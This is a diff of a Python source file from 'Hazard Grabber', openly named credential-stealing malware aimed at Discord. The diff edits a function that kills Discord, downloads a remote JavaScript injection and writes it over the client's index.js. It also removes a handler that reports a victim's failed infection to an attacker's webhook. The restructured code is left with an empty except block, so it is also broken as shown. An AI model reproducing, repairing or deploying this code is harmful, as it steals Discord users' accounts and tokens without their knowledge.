@@ -224,10 +224,10 @@ def HazardStealer():
 		if any(procstr in proc.name() for procstr in\
 		['discord', 'Discord', 'DISCORD',]):
 			proc.kill()
-	try:
-		for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
-			for name in dirs:
-				if (name.__contains__("discord_desktop_core-")):
+	for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
+		for name in dirs:
+			if (name.__contains__("discord_desktop_core-")):
+				try:
 					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
 					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
 					f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
@@ -239,34 +239,13 @@ def HazardStealer():
 					with open(directory_list, 'w'): pass
 					with open(directory_list, 'r+') as index_file3:
 						index_file3.write(replace_string)
-		for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
-			for name in files:
-				discord_file = os.path.join(root, name)
-				os.startfile(discord_file)
-	except:
-		pass
+				except Exception as e:
+	for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
+		for name in files:
+			discord_file = os.path.join(root, name)
+			os.startfile(discord_file)
 
-if password_stealer:
-    HazardStealer()
-try:
-	main()
-except Exception as e:
-    embeds2 = []
-    webhook2 = {
-		"content": "",
-		"embeds": embeds2,
-		"username": "Hazard Err",
-		"avatar_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png"
-	}
-    embed2 = {
-		"color": 15007744,
-        "author": {
-            "name": "Woopsie daisy",
-            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png",
-            "url": "https://github.com/Rdimo/Hazard-Nuker#important"
-        },
-        "description": f"**Hazard Grabber Caught Error:**\n```fix\n{e}```\n They ran the file but Seems like Hazard couldn't grab their info :(",
-        }
-    embeds2.append(embed2)    
-    urlopen(Request(webhook_url, data=dumps(webhook2).encode(), headers=getheaders()))
-    pass
+if __name__ == "__main__":
+    main()
+    if password_stealer:
+        HazardStealer()
